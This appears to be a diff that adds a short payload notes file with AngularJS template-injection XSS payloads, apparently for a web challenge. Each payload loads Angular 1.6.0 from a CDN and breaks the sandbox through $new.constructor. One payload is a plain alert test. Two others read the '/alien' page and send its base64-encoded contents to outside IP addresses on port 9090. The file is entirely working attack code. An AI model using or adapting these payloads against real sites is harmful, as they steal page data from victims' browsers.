@@ -1,0 +1,10 @@
+# Working alert() payload
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
+<div ng-app>{{$new.constructor('alert(2)')()}}</div ng-app>
+
+# Payloads to visit site and then send response to another
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
+<div ng-app>{{$new.constructor('var z=new XMLHttpRequest();z.onreadystatechange=function(){if (z.responseText) location="http://172.17.0.1:9090/?a="+btoa(unescape(encodeURIComponent(z.responseText)))};z.open("GET","/alien",false);z.send();')()}}</div ng-app>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
+<div ng-app>{{$new.constructor('var z=new XMLHttpRequest();z.onreadystatechange=function(){if (z.responseText) location="http://104.238.133.245:9090/?a="+btoa(unescape(encodeURIComponent(z.responseText)))};z.open("GET","/alien",false);z.send();')()}}</div ng-app>
